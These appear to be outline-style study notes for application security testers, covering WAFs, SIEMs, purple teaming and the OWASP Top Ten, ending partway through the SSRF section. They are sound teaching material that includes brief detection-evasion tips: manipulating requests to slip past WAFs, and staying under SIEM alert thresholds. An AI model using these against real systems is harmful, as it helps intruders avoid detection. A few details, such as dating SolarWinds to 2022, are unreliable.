&nbsp;	• Web Application Firewalls (WAFs) are security tools that filter and inspect HTTP/HTTPS traffic to block malicious requests (like SQL injection and XSS). As an application security tester, you need to understand how WAFs work, how to deploy/tune them effectively, and how attackers may try to evade them.

&nbsp;	• Key Concepts

&nbsp;		○ What a WAF Is

&nbsp;			§ Defensive technology for web traffic, different from a network firewall.

&nbsp;			§ Inspects HTTP/HTTPS payloads instead of just ports/IPs.

&nbsp;			§ Detects malicious patterns (SQLi, XSS) while allowing legitimate traffic.

&nbsp;		○ Benefits

&nbsp;			§ Can virtually patch applications—defend against known exploits while developers work on permanent fixes.

&nbsp;			§ Supports custom rules tailored to an app’s traffic.

&nbsp;		○ Open Source WAF Options

&nbsp;			§ ModSecurity (most popular; Apache module, now broader).

&nbsp;				□ OWASP maintains the ModSecurity Core Rule Set (CRS).

&nbsp;			§ NAXSI (Nginx Anti-XSS \& SQLi).

&nbsp;			§ WebKnight (for IIS).

&nbsp;			§ Shadow Daemon.

&nbsp;			§ OWASP Coraza.

&nbsp;		○ Deployment Best Practices

&nbsp;			§ Start in listen-only mode (monitoring, not blocking).

&nbsp;			§ Collect baseline data on legitimate traffic.

&nbsp;			§ Enable alerts gradually (e.g., for OWASP Top 10 attacks).

&nbsp;			§ Test with vulnerability scans and pen tests before enabling blocking.

&nbsp;			§ Roll out rules incrementally to avoid false positives disrupting production.

&nbsp;		○ Evasion \& Testing

&nbsp;			§ Identifying WAF type:

&nbsp;				□ Look for cookies, HTTP header values, error messages.

&nbsp;				□ Tools: nmap --script http-waf-detect, Wafw00f (Kali Linux).

&nbsp;			§ Evasion techniques:

&nbsp;				□ Manipulate request characters to bypass detection.

&nbsp;				□ White-box pen test: review rule sets, craft payloads that “slip through.”

&nbsp;				□ Tools: WAFNinja (GitHub project).



Security Information and Event Management Program (SIEMs)

&nbsp;	• Security Information and Event Management (SIEM) systems combine log management and incident response automation to detect, correlate, and alert on potential attacks. As a penetration tester, you must understand how SIEMs work, how they’re deployed, and how to avoid triggering alerts during testing.

&nbsp;	• Key Concepts

&nbsp;		○ What a SIEM Is

&nbsp;			§ Combination of two technologies:

&nbsp;				□ SIM (Security Information Management): collects/analyzes logs, extracts events, automates log management.

&nbsp;				□ SEM (Security Event Management): performs real-time threat analysis and incident response automation.

&nbsp;			§ Together: provide centralized log management + incident detection/response.

&nbsp;		○ Core Capabilities

&nbsp;			§ Log aggregation: Collect logs from disparate systems in one searchable interface.

&nbsp;			§ Correlation: Identify relationships/patterns that suggest malicious activity.

&nbsp;			§ Analysis: Allow manual inspection and advanced pattern hunting.

&nbsp;			§ Alerting: Near real-time alerts on suspicious behavior.

&nbsp;		○ Open Source \& Popular SIEM Tools

&nbsp;			§ ELK Stack (Elasticsearch, Logstash, Kibana) – most popular open-source option.

&nbsp;			§ OSSEC+ – host-based IDS usable as SIEM with configuration.

&nbsp;			§ OSSIM (AlienVault) – open-source SIEM, lightweight version of commercial offering.

&nbsp;			§ Snort – IDS/IPS at network level, sometimes used in SIEM setups.

&nbsp;			§ Splunk – commercial, but very popular (free version has data limits).

&nbsp;		○ Cloud-Native SIEMs

&nbsp;			§ AWS: Control Tower.

&nbsp;			§ Azure: Microsoft Sentinel.

&nbsp;			§ Google: Chronicle.

&nbsp;			§ Adoption depends heavily on budget, since cloud services are pay-as-you-go.

&nbsp;		○ Best Practices for SIEM Deployment

&nbsp;			§ Feed logs from all infrastructure components:

&nbsp;				□ Application logs

&nbsp;				□ Web server logs (Apache, IIS)

&nbsp;				□ NetFlow logs

&nbsp;				□ Host OS logs

&nbsp;				□ Database logs

&nbsp;				□ WAF logs

&nbsp;			§ More logs = better detection \& correlation.

&nbsp;			§ Without proper logs, SIEM cannot function effectively.

&nbsp;		○ Pen Testing \& Evasion Strategies

&nbsp;			§ OSINT (Open-Source Intelligence): Safe, since it doesn’t touch monitored systems.

&nbsp;			§ Attack style: Use “low and slow” instead of brute force.

&nbsp;			§ Threshold evasion: SIEMs tune out “noise” by setting thresholds (e.g., 1 failed login/minute = normal; 60/minute = attack). Stay under those thresholds to avoid alerts.

&nbsp;			§ SIEM is not internet-facing → won’t be directly visible in pen tests.



Purple Teaming

&nbsp;	• Traditional penetration testing pits Red Teams (attackers) against Blue Teams (defenders) in an adversarial way, but Purple Teaming emphasizes collaboration between them. By working side by side, sharing techniques, and improving defenses together, organizations strengthen security more effectively than through red vs. blue competition.

&nbsp;	• Key Concepts

&nbsp;		○ Traditional Red vs. Blue

&nbsp;			§ Red Team (Attackers):

&nbsp;				□ Breakers who think like adversaries.

&nbsp;				□ Goal: find ways to bypass controls, exploit weaknesses, and replicate real-world attacker behavior.

&nbsp;				□ Known for “out-of-the-box” and sometimes rule-breaking thinking.

&nbsp;				□ Reference guide: Red Team Field Manual (RTFM).

&nbsp;			§ Blue Team (Defenders):

&nbsp;				□ Builders who focus on prevention, detection, and response.

&nbsp;				□ Goal: ensure layers of security controls (defense-in-depth).

&nbsp;				□ Typical concerns: strong authentication, logging, patching, monitoring.

&nbsp;				□ Reference guide: Blue Team Field Manual (BTFM) (based on the NIST Cybersecurity Framework).

&nbsp;		○ Purple Teaming Defined

&nbsp;			§ A collaborative model where Red and Blue teams work together during penetration tests.

&nbsp;			§ Instead of adversarial secrecy, both sides share tools, techniques, and findings in real time.

&nbsp;			§ Blue Teamers learn how attackers bypass controls.

&nbsp;			§ Red Teamers see how defenders detect/respond and adapt accordingly.

&nbsp;		○ Benefits of Purple Teaming

&nbsp;			§ Knowledge exchange: Attackers show how controls are bypassed; defenders adapt controls immediately.

&nbsp;			§ Faster resilience: Defenses are strengthened iteratively during testing, not months later.

&nbsp;			§ Skill-building: Both teams sharpen expertise—Red learns detection gaps, Blue learns attack methods.

&nbsp;			§ Increased security maturity: Results in stronger production applications and incident response capabilities.

&nbsp;		○ Practical Tips

&nbsp;			§ Recruit creative thinkers internally who can act as Red Teamers.

&nbsp;			§ Recruit detail-oriented defenders for Blue Team roles.

&nbsp;			§ Provide them with respective field manuals (RTFM for Red, BTFM for Blue).

&nbsp;			§ Foster collaboration, not competition, during pen tests.





#### Testing for the OWASP Top Ten



The OWASP Top Ten

&nbsp;	The OWASP Top 10 is the most widely recognized and influential project in application security. It provides a focused starting point for building a testing program without overwhelming developers and testers. Alongside the Top 10, related OWASP projects (Mobile Security and Proactive Controls) help expand security practices to mobile apps and shift security earlier in the development lifecycle.

&nbsp;	• Key Concepts

&nbsp;		○ OWASP Top 10 Overview

&nbsp;			§ Began in early 2000s as a thought experiment → now the cornerstone of application security.

&nbsp;			§ Identifies the 10 most critical web application security risks.

&nbsp;			§ Updated every 3 years, released first in English then translated globally.

&nbsp;			§ Widely adopted in commercial and open-source security tools.

&nbsp;			§ Used for testing, reporting, and industry benchmarking.

&nbsp;		○ Why Start with OWASP Top 10

&nbsp;			§ Prevents overcomplication and overwhelm for testers/developers.

&nbsp;			§ Provides a walk-before-run approach: build a foundation, achieve early wins, then expand.

&nbsp;			§ Ensures focus on high-impact, common risks first.

&nbsp;		○ Related OWASP Projects

&nbsp;			§ OWASP Mobile Application Security Project

&nbsp;				□ Recognizes that mobile app risks differ from web app risks.

&nbsp;				□ Provides:

&nbsp;					® Mobile Top 10

&nbsp;					® Mobile Application Security Testing Guide

&nbsp;					® Mobile Application Security Verification Standard (MASVS)

&nbsp;					® Mobile Application Security Checklist

&nbsp;				□ OWASP Proactive Controls Project

&nbsp;					® Focuses on prevention rather than reaction.

&nbsp;					® Helps developers build security in from the start.

&nbsp;					® Developer-centric → practical steps to avoid introducing vulnerabilities.

&nbsp;				□ Practical Advice

&nbsp;					® Don’t try to test everything at once → focus on the Top 10 risks first.

&nbsp;					® Gain a few successes early to build confidence and momentum.

&nbsp;					® Use Top 10 as the foundation, then expand into mobile and proactive controls as maturity grows.



A1: Broken Access Control

&nbsp;	• Broken access control is the most significant risk in the OWASP Top 10. It occurs when applications fail to properly enforce rules that restrict what authenticated users can do or see. These flaws are difficult for automated scanners to detect and often require manual testing aligned with business rules to identify. Exploiting these flaws can lead to account impersonation, privilege escalation, or unauthorized access to sensitive data.

&nbsp;	• Key Concepts

&nbsp;		○ What is Broken Access Control?

&nbsp;			§ Access control = restrictions on what authenticated users can do.

&nbsp;			§ Broken access control = when users can go beyond their intended permissions.

&nbsp;			§ Examples:

&nbsp;				□ A user accessing another’s data.

&nbsp;				□ A low-privileged user escalating to admin rights.

&nbsp;				□ Accessing restricted directories or APIs.

&nbsp;		○ Why It’s a Serious Risk

&nbsp;			§ Automated scanners struggle to detect these flaws since they don’t understand business rules.

&nbsp;			§ Business-specific rules vary (e.g., who can reset whose password).

&nbsp;			§ Developers may miss controls without a standardized access management framework.

&nbsp;			§ Impact can range from annoyance → full application takeover.

&nbsp;		○ Testing for Broken Access Control

&nbsp;			§ Manual testing is essential.

&nbsp;			§ Check:

&nbsp;				□ Account provisioning (self-registration vs. manual request).

&nbsp;				□ Directory protections (unprotected folders, directory listing disabled).

&nbsp;				□ Privilege escalation paths (can you assign yourself new permissions?).

&nbsp;			§ OWASP Web Security Testing Guide:

&nbsp;				□ Identity management tests (Section 4.3).

&nbsp;				□ Authorization tests (Section 4.5).

&nbsp;		○ Preventive Measures \& Best Practices

&nbsp;			§ Default deny mindset → deny everything unless explicitly allowed.

&nbsp;			§ Role-based access control (RBAC) → re-use standardized mechanisms.

&nbsp;			§ Validate permissions on every request → never assume continued authorization.

&nbsp;			§ Logging and monitoring → developers implement logging, security teams monitor/respond.

&nbsp;			§ Rate limiting → prevent automated brute-force or abuse of APIs.

&nbsp;			§ Disable directory listing at web server level.

&nbsp;			§ Use the OWASP Authorization Cheat Sheet:

&nbsp;				□ Enforce least privilege.

&nbsp;				□ Deny by default.

&nbsp;				□ Validate permissions rigorously.

&nbsp;		○ Example Attack

&nbsp;			§ Pen tester exploited an app with identical user permissions.

&nbsp;			§ Changed user identifier post-login → impersonated other users.

&nbsp;			§ Found an admin account → full takeover of application.



A2: Cryptographic Failures

&nbsp;	• Cryptographic failures occur when sensitive data is not properly protected at rest or in transit. These flaws can allow attackers to steal or manipulate data without exploiting deeper vulnerabilities like injection or broken access controls. Proper planning, implementation, and management of encryption, hashing, and encoding are essential to prevent data breaches, regulatory fines, and reputational damage.

&nbsp;	• Key Concepts

&nbsp;		○ What Are Cryptographic Failures?

&nbsp;			§ Occur when sensitive data is:

&nbsp;				□ Unencrypted in transit (e.g., HTTP instead of HTTPS).

&nbsp;				□ Unencrypted at rest (e.g., passwords or PII stored in plaintext).

&nbsp;				□ Improperly encrypted (weak algorithms, poor key management).

&nbsp;				□ Accessible without controls (misconfigured directories).

&nbsp;			§ Result: Data can be stolen without advanced exploitation.

&nbsp;		○ Common Causes

&nbsp;			§ Encryption not defined in early design requirements.

&nbsp;			§ Improper implementation (e.g., weak keys, outdated ciphers, storing raw secrets).

&nbsp;			§ Confusion between:

&nbsp;				□ Encryption → reversible with a key.

&nbsp;				□ Hashing → one-way, used for integrity and passwords.

&nbsp;				□ Encoding → reversible, not security (e.g., Base64).

&nbsp;		○ Risks \& Impact

&nbsp;			§ Data breaches exposing sensitive personal, financial, or healthcare data.

&nbsp;			§ Regulatory fines: GDPR, CCPA, PIPEDA, HIPAA.

&nbsp;			§ Business damage: cost, reputation loss, compliance penalties.

&nbsp;			§ Attack scenarios:

&nbsp;				□ Adversary-in-the-middle attack steals data in transit.

&nbsp;				□ Weak ciphers downgraded or brute-forced.

&nbsp;				□ Cached sensitive data extracted.

&nbsp;		○ Best Practices \& Mitigations

&nbsp;			§ Data classification policy: Define what is “sensitive” and how it must be protected.

&nbsp;			§ Encrypt everywhere:

&nbsp;				□ Data in transit (TLS/SSL).

&nbsp;				□ Data at rest (disk/database).

&nbsp;			§ Avoid unnecessary data storage/transmission: Less data = less exposure.

&nbsp;			§ Strong password storage: Salted hashing functions (bcrypt, Argon2).

&nbsp;			§ Disable caching of sensitive data.

&nbsp;			§ Key management: Define lifecycle, rotation, and storage practices.

&nbsp;			§ Use strong algorithms: Avoid known-weak ciphers (e.g., MD5, SHA-1, RC4).

&nbsp;		○ OWASP Resources

&nbsp;			§ OWASP Web Security Testing Guide (4.9) → tests for weak cryptography.

&nbsp;			§ OWASP Cheat Sheets:

&nbsp;				□ Transport Layer Protection.

&nbsp;				□ User Privacy Protection.

&nbsp;				□ Password Storage.

&nbsp;				□ Cryptographic Storage.

&nbsp;			§ OWASP Proactive Controls (C8) → emphasizes classifying data, encryption in transit \& at rest, and key/secret management processes.



A3: Injection

&nbsp;	• Injection flaws (e.g., SQL injection, command injection) occur when untrusted input is sent to a backend interpreter (SQL database, OS command shell, LDAP, XML parser, etc.) without proper validation or sanitization. Since interpreters execute any commands they’re given, attackers can manipulate inputs to execute malicious commands, extract sensitive data, or even take control of entire servers. Injection remains one of the most critical and long-standing risks in the OWASP Top 10.

&nbsp;	• Key Concepts

&nbsp;		○ What is Injection?

&nbsp;			§ Occurs when untrusted input is sent to a backend interpreter.

&nbsp;			§ Interpreters (SQL, OS commands, LDAP, etc.) don’t validate intent—they just execute commands.

&nbsp;			§ Attackers exploit this by manipulating input fields, parameters, or requests.

&nbsp;		○ Attack Vectors

&nbsp;			§ Form fields (login forms, search boxes).

&nbsp;			§ URL parameters (GET/POST variables).

&nbsp;			§ Environment variables.

&nbsp;			§ Application parameters (JSON, XML, API calls).

&nbsp;			§ User-supplied data anywhere input is accepted.

&nbsp;		○ Techniques Used by Attackers

&nbsp;			§ Escape characters: trick interpreters into reinterpreting data as commands.

&nbsp;			§ SQL Injection (SQLi): e.g., making “1=1” true to log in as admin.

&nbsp;			§ Parameter tampering: Adding extra parameters to search queries or JSON.

&nbsp;			§ Command injection: Sending OS-level commands via the app.

&nbsp;			§ Other types: LDAP, NoSQL, XML, XPath, SMTP, IMAP, ORM, SSI injection.

&nbsp;		○ Impacts

&nbsp;			§ Unauthorized data access (e.g., dump entire database).

&nbsp;			§ Privilege escalation.

&nbsp;			§ Compromise of backend servers (full system takeover).

&nbsp;			§ Large-scale data breaches → reputational \& financial damage.

&nbsp;		○ Testing Guidance

&nbsp;			§ Focus dynamic testing on form fields and URL parameters.

&nbsp;			§ OWASP Testing Guide (Section 4.7) → detailed coverage of multiple injection types.

&nbsp;			§ Look for exploitable queries, commands, or parameters.

&nbsp;		○ Prevention \& Mitigation

&nbsp;			§ Use safe APIs and ORM (Object Relational Mapping) tools → avoid raw query construction.

&nbsp;			§ Whitelist input validation (restrict allowed values when feasible).

&nbsp;			§ Encode input before sending to interpreters (to neutralize malicious characters).

&nbsp;			§ Escape special characters properly if dynamic queries are unavoidable.

&nbsp;			§ Use native controls (e.g., LIMIT in SQL to restrict data exposure).

&nbsp;			§ Avoid trusting user input → always sanitize.

&nbsp;		○ Resources

&nbsp;			§ OWASP Injection Prevention Cheat Sheet → examples and secure coding practices.

&nbsp;			§ Bobby Tables (XKCD-inspired) → practical, language-specific SQL injection prevention guide.



A4: Insecure Design

&nbsp;	• Insecure design refers to flaws built into an application’s architecture from the start. Unlike coding/implementation errors, these flaws originate in the planning and design phase of the SDLC. Because they stem from missing or misunderstood business risks, insecure design flaws can’t be fixed with perfect implementation—they require a shift toward secure design practices early in development, threat modeling, and use of maturity models like SAMM and BSIMM.

&nbsp;	• Key Concepts

&nbsp;		○ What is Insecure Design?

&nbsp;			§ Security flaws introduced before code is written, due to poor planning.

&nbsp;			§ Examples:

&nbsp;				□ No mechanism to delete personal data → GDPR violations.

&nbsp;				□ Business risks misunderstood or undocumented.

&nbsp;			§ Design flaws ≠ implementation flaws:

&nbsp;				□ Secure design can mitigate coding mistakes.

&nbsp;				□ But good coding can’t fix insecure design.

&nbsp;		○ Why It’s Risky

&nbsp;			§ Overlooked because organizations often focus on fixing vulnerabilities instead of building security into design.

&nbsp;			§ User stories may emphasize functionality only, ignoring security requirements.

&nbsp;			§ Costly to remediate after deployment → cheaper to design securely upfront.

&nbsp;		○ How to Identify Insecure Design

&nbsp;			§ Review documentation:

&nbsp;				□ SDLC process → does it account for security?

&nbsp;				□ Software Bill of Materials (SBOM): are any libraries insecure?

&nbsp;				□ Test cases \& tools: are security tests integrated into CI/CD?

&nbsp;			§ Look for absence of security-focused design patterns.

&nbsp;		○ How to Address the Risk

&nbsp;			§ Threat modeling: anticipate how attackers might exploit the system.

&nbsp;			§ Reference architectures: reuse proven secure designs (e.g., AWS, Azure, GCP).

&nbsp;			§ Document secure design patterns: e.g., “never put user ID in the URL string.”

&nbsp;			§ Define misuse/abuse cases: simulate how attackers would exploit the design.

&nbsp;			§ Build test cases around threats to validate resilience.

&nbsp;			§ Use maturity models to measure and improve secure design:

&nbsp;				□ OWASP SAMM (Software Assurance Maturity Model).

&nbsp;				□ BSIMM (Building Security In Maturity Model).

&nbsp;		○ Culture \& Process Shift

&nbsp;			§ Requires a mindset change: security is not just QA or post-development.

&nbsp;			§ Needs buy-in from developers, architects, and leadership.

&nbsp;			§ Moves security from an afterthought to a core requirement of business processes.



A5: Security Misconfiguration

&nbsp;	• Security misconfiguration is one of the most common and dangerous OWASP Top 10 risks. It refers to insecure, default, or poorly maintained configurations in applications, servers, or infrastructure. These flaws often arise from weak patch management, verbose error handling, default settings, or improperly secured cloud storage. Misconfigurations can lead to data breaches, system compromise, or attacker advantage — but they’re also among the easiest vulnerabilities to detect and fix when processes and documentation are in place.

&nbsp;	• Key Concepts

&nbsp;		○ Definition

&nbsp;			§ Insecure or default configurations in applications or infrastructure.

&nbsp;			§ Can occur in OS, servers, frameworks, libraries, cloud storage, or application settings.

&nbsp;			§ Includes verbose error messages, exposed config files, weak permissions, unpatched software, or unnecessary components.

&nbsp;		○ Causes of Misconfiguration

&nbsp;			§ Default or insecure settings left enabled (e.g., sample pages, README files).

&nbsp;			§ Verbose error messages exposing stack traces or system details.

&nbsp;			§ Patch management failures: missing updates for OS, frameworks, libraries, apps.

&nbsp;			§ Infrastructure changes that introduce new default configs.

&nbsp;			§ Application changes that add insecure libraries/frameworks.

&nbsp;			§ Cloud storage misconfigurations (open S3 buckets, overly permissive roles).

&nbsp;		○ Risks and Impacts

&nbsp;			§ Range from minor (info disclosure from error messages) to severe (data breaches, full system compromise).

&nbsp;			§ Example:

&nbsp;				□ Directory permissions exposing sensitive files.

&nbsp;				□ World-readable config files containing database credentials.

&nbsp;				□ PHP info pages revealing backend details.

&nbsp;		○ Detection and Testing

&nbsp;			§ Automated vulnerability scanners are effective (binary checks: patch missing or not, version outdated or not).

&nbsp;			§ Dynamic testing → intentionally trigger errors (e.g., HTTP 500) to check error handling and logging.

&nbsp;			§ OWASP Web Security Testing Guide Section 4.2 → 11 tests for security misconfigurations.

&nbsp;		○ Prevention and Mitigation

&nbsp;			§ Documented, repeatable hardening procedures for apps and infrastructure.

&nbsp;			§ Integrate into change control process.

&nbsp;			§ Remove unnecessary components/services (reduce attack surface).

&nbsp;			§ Cloud storage best practices: deny-all first, then grant minimum required access.

&nbsp;			§ Use segmentation and containerization to contain threats.

&nbsp;			§ Restrict verbose error handling to non-production only.

&nbsp;		○ Logging and Monitoring

&nbsp;			§ Proper logging essential for detecting and responding to incidents.

&nbsp;			§ Use resources like Lenny Zeltser’s Critical Log Review Checklist to guide log collection and monitoring.

&nbsp;			§ Ensure security teams can produce logs during incidents with confidence.



A6: Vulnerable and Outdated Components

&nbsp;	• Applications often rely on third-party components (libraries, frameworks, modules), and if these contain known vulnerabilities or are outdated, no configuration changes can protect the app. Without an inventory and maintenance process, these components become high-risk entry points for attackers (e.g., Drupalgeddon, Log4Shell). Preventing this requires streamlining dependencies, maintaining a Software Bill of Materials (SBOM), and continuously monitoring and updating components.

&nbsp;	• Key Concepts

&nbsp;		○ Definition \& Nature of the Risk

&nbsp;			§ Using components with known vulnerabilities introduces risks into web apps.

&nbsp;			§ Different from security misconfiguration: you can’t “configure away” a vulnerability in a component.

&nbsp;			§ Risks increase with application complexity and reliance on third-party libraries.

&nbsp;		○ Why It Happens

&nbsp;			§ Developers adopt components for fast, proven solutions without always reviewing their security.

&nbsp;			§ Lack of inventory or SBOM makes it difficult to track what’s being used.

&nbsp;			§ Projects or libraries may become unsupported/dormant, leaving vulnerabilities unpatched.

&nbsp;		○ Notable Examples

&nbsp;			§ Drupalgeddon (2014) – catastrophic Drupal CMS flaw.

&nbsp;			§ Drupalgeddon2 (2018) – similar repeat exposure.

&nbsp;			§ Log4Shell (2021) – Log4j RCE impacting systems worldwide.

&nbsp;			§ Illustrates high business impact when critical components are vulnerable.

&nbsp;		○ Business Impact

&nbsp;			§ Varies by severity of flaw + role of the application.

&nbsp;			§ Could lead to data breaches, service outages, or full compromise.

&nbsp;			§ Harder to remediate than misconfigurations — sometimes apps depend on vulnerable components.

&nbsp;		○ Detection \& Testing

&nbsp;			§ Automated vulnerability scanners excel at finding outdated components.

&nbsp;				□ Flag known versions (e.g., old Log4j).

&nbsp;				□ Can be fooled by custom banners masking version numbers.

&nbsp;			§ OSINT + web proxies → capture traffic, identify component versions, and cross-check with CVE databases.

&nbsp;		○ Best Practices \& Mitigation

&nbsp;			§ Remove unnecessary components – streamline dependencies.

&nbsp;			§ Maintain a Software Bill of Materials (SBOM) with:

&nbsp;				□ Maintain a Software Bill of Materials (SBOM) with:

&nbsp;				□ Use case

&nbsp;				□ Version

&nbsp;				□ Source location

&nbsp;			§ Use only trusted, signed components from reliable repositories.

&nbsp;			§ Continuously monitor updates \& activity around projects (avoid dormant projects).

&nbsp;		○ Resources \& Tools

&nbsp;			§ OWASP Dependency-Check – Software Composition Analysis (SCA) tool for Java/.NET (works with Maven, Gradle, Jenkins, SonarQube, etc.).

&nbsp;			§ MITRE CVE database – central repository of publicly disclosed vulnerabilities.

&nbsp;			§ Other SCA tools can help identify vulnerable open-source dependencies across different ecosystems.

&nbsp;			



A7: Identification and Authentication Failures

&nbsp;	• Applications are vulnerable if authentication and session management controls are weak or misconfigured. Attackers can bypass logins, reuse stolen credentials, or hijack sessions to gain unauthorized access. Strong identity and access management (IAM), secure session handling, and multifactor authentication (MFA) are essential to preventing these failures.

&nbsp;	• Key Concepts

&nbsp;		○ Nature of the Risk

&nbsp;			§ Identification and authentication failures occur when:

&nbsp;				□ Login controls are weak (default passwords, poor password policies, missing MFA).

&nbsp;				□ Session management is insecure (predictable or reusable session tokens).

&nbsp;			§ Attackers exploit stolen credentials, brute force, credential stuffing, or session hijacking.

&nbsp;		○ Causes

&nbsp;			§ Lack of IAM planning early in development (no standards on password strength, MFA, session rules).

&nbsp;			§ Weak session controls: no lockouts, predictable session IDs, session reuse, simultaneous logins from multiple devices.

&nbsp;			§ Default or guessable credentials still active in production.

&nbsp;		○ Examples of Impact

&nbsp;			§ Low impact: Library app exposing borrowing history.

&nbsp;			§ High impact: Banking app enabling account takeovers and wire transfers.

&nbsp;			§ Critical impact: Infrastructure admin app compromise → full environment takeover.

&nbsp;		○ Testing Considerations

&nbsp;			§ Inspect login and logout flows, cookies, and session variables.

&nbsp;			§ Look for predictable or reusable session IDs (e.g., in URLs).

&nbsp;			§ Validate that weak or default passwords are rejected.

&nbsp;			§ Confirm account lockout and IP lockout for repeated failed logins.

&nbsp;			§ Use OWASP Web Security Testing Guide:

&nbsp;				□ Section 4.3 → identity management (5 tests).

&nbsp;				□ Section 4.4 → authentication (10 tests).

&nbsp;				□ Section 4.6 → session management (9 tests).

&nbsp;		○ Mitigation Best Practices

&nbsp;			§ Multifactor authentication (MFA): Strongest defense against credential misuse.

&nbsp;			§ password hygiene:

&nbsp;				□ Block weak, default, and known-compromised passwords.

&nbsp;				□ Avoid overly complex requirements that harm usability.

&nbsp;				□ Use thoughtful password reset questions (not guessable from social media).

&nbsp;			§ Session management:

&nbsp;				□ Implement on the server-side (client-side controls are easily bypassed).

&nbsp;				□ Use secure cookies, invalidate tokens at logout, expire sessions after inactivity.

&nbsp;				□ Ensure tokens are unpredictable and not exposed in URLs.

&nbsp;			§ Monitoring \& lockouts:

&nbsp;				□ Enforce login attempt lockouts (per account + per IP).

&nbsp;				□ Alert on suspicious login attempts or credential stuffing.

&nbsp;		○ Supporting Resources

&nbsp;			§ OWASP Cheat Sheets:

&nbsp;				□ Authentication

&nbsp;				□ Credential Stuffing Prevention

&nbsp;				□ Password Reset

&nbsp;				□ Session Management

&nbsp;			§ OWASP Web Security Testing Guide → concrete tests for IAM and session flaws.



A8: Software and Data Integrity Failures

&nbsp;	• Software and data integrity failures occur when applications, components, or processes blindly trust unverified code, data, or updates. Without mechanisms to validate integrity, attackers can slip in malicious code (supply-chain attacks, pipeline tampering, untrusted updates), leading to breaches on a massive scale.

&nbsp;	• Key Concepts

&nbsp;		○ What the Risk Is

&nbsp;			§ Based on assumed trust:

&nbsp;				□ That user-provided data is what’s expected.

&nbsp;				□ That software components behave as intended.

&nbsp;			§ If this trust is misplaced, attackers can exploit the gap.

&nbsp;			§ This category evolved from Insecure Deserialization in OWASP 2017, broadened to include integrity flaws in software supply chains and CI/CD pipelines.

&nbsp;		○ How It Happens

&nbsp;			§ Unvalidated updates: Automatic or manual updates applied without integrity checks.

&nbsp;			§ Third-party libraries: Developers pull dependencies from external repos without verifying authenticity.

&nbsp;			§ CI/CD pipeline weaknesses: Poor access controls or weak change management allow tampering.

&nbsp;			§ Serialized/encoded data flaws: Lack of validation lets attackers smuggle malicious payloads.

&nbsp;		○ Examples

&nbsp;			§ PyPI incident (2022): A student uploaded ransomware to the Python Package Index; it was downloaded hundreds of times.

&nbsp;			§ SolarWinds (2022): Attackers poisoned Orion software updates, breaching ~30,000 orgs, including enterprises and governments.

&nbsp;			§ General risk: Once attackers compromise integrity, they can run their own code as if it’s trusted.

&nbsp;		○ Detection and Testing

&nbsp;			§ Validate digital signatures for updates, libraries, and components.

&nbsp;			§ Use an SBOM (Software Bill of Materials) to know what libraries are in your stack.

&nbsp;			§ Review SDLC documentation (especially code reviews \& change control).

&nbsp;			§ Check CI/CD pipeline controls for weak permissions and poor configuration management.

&nbsp;		○ Mitigation and Best Practices

&nbsp;			§ SBOMs: Maintain a full inventory of components and dependencies.

&nbsp;			§ Digital signature validation: Automate verification before trusting code or updates.

&nbsp;			§ Internal repositories: Vet external libraries, then host them in a trusted repo for devs to use.

&nbsp;			§ Good documentation: Clear SDLC standards, code review processes, and change control policies.

&nbsp;			§ Third-party vetting: Scan libraries for vulnerabilities before integrating them.

&nbsp;		○ Helpful Tools \& Resources

&nbsp;			§ OWASP CycloneDX: Standard for building SBOMs, includes guidance, advisory format, and ~200 supporting tools.

&nbsp;			§ OWASP Dependency-Check: Automates software composition analysis (SCA), scanning dependencies for known vulnerabilities (via CVE databases).



A9: Security Logging and Monitoring Failures

&nbsp;	• Security logging and monitoring failures occur when applications lack proper logging, monitoring, and alerting mechanisms. Without them, attackers can operate undetected, moving from reconnaissance to exploitation and full compromise. Logging and monitoring are essential for early detection, containment, and response to attacks.

&nbsp;	• Key Concepts

&nbsp;		○ Why These Failures Happen

&nbsp;			§ Developers prioritize functionality and go-live deadlines over logging.

&nbsp;			§ Security logging requirements often aren’t defined in the project.

&nbsp;			§ Developers may lack security training or awareness of the risks.

&nbsp;			§ Missing policies, standards, and documentation leave teams without guidance.

&nbsp;		○ Impact of Logging Failures

&nbsp;			§ Reconnaissance phase: attackers probe apps—if logs detect this, damage is negligible.

&nbsp;			§ Attack phase: if recon goes unnoticed, attackers attempt injections, brute force, etc.—impact increases.

&nbsp;			§ Full compromise: without logging/alerts, attackers can breach data, take over systems, or cause outages.

&nbsp;			§ Severity depends on application criticality and whether it processes sensitive/restricted data.

&nbsp;		○ Detection \& Testing

&nbsp;			§ Failures are hard to spot in black box tests (no internal visibility).

&nbsp;			§ Better tested with white box or gray box approaches, often via purple teaming (red team + blue team collaboration).

&nbsp;			§ Blue team must validate whether logs:

&nbsp;				□ Were generated.

&nbsp;				□ Contain required details.

&nbsp;				□ Triggered alerts and responses.

&nbsp;		○ Mitigation \& Best Practices

&nbsp;			§ Log high-value events:

&nbsp;				□ Login activity (success/failure).

&nbsp;				□ Access control failures.

&nbsp;				□ Input validation failures.

&nbsp;			§ Centralize logs on a secure server (prevents tampering and supports correlation).

&nbsp;			§ Implement integrity controls to detect log modification/deletion.

&nbsp;			§ Ensure logs are reviewed and acted upon, not just collected.

&nbsp;		○ Resources

&nbsp;			§ Lenny Zeltser’s Critical Log Review Cheat Sheet – practical guidance for incident logging.

&nbsp;			§ NIST SP 800-61 Rev 2 – Computer Security Incident Handling Guide.

&nbsp;			§ Intelligence Community Standard (ICS) 500-27 – advanced guidance on audit data collection and sharing.



A10: Server-Side Request Forgery (SSRF)

&nbsp;	• Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to trick a server into making unintended requests, often to internal systems or sensitive resources, bypassing security boundaries. SSRF is increasingly dangerous in cloud environments and has caused multiple major breaches.

&nbsp;	• Key Concepts

&nbsp;		○ What SSRF Is

&nbsp;			§ An attacker manipulates server-side URL requests to access or abuse internal resources.

&nbsp;			§ Differs from command injection:

&nbsp;					® Command injection = attacker forces server to run system-level commands.

&nbsp;					® SSRF = attacker tricks server into making network requests, possibly leading to further compromise.

&nbsp;		○ How SSRF Works

&nbsp;			§ Attacker supplies a crafted URL or input field value.

&nbsp;			§ If the app doesn’t validate URLs, the server will process requests like:

&nbsp;				□ Local file access (e.g., /etc/passwd on Linux).

&nbsp;				□ Internal network mapping (hostnames, IPs, ports).

&nbsp;				□ Requests to attacker-controlled URLs → enabling malicious code execution or DoS.

&nbsp;			§ Cloud misconfigurations (like exposed storage buckets) amplify the risk.

&nbsp;		○ Risks \& Impact

&nbsp;			§ Unauthorized access to internal services (databases, APIs).

&nbsp;			§ Data theft (sensitive files).

&nbsp;			§ Remote code execution (RCE).

&nbsp;			§ Denial-of-service (overloading internal servers).

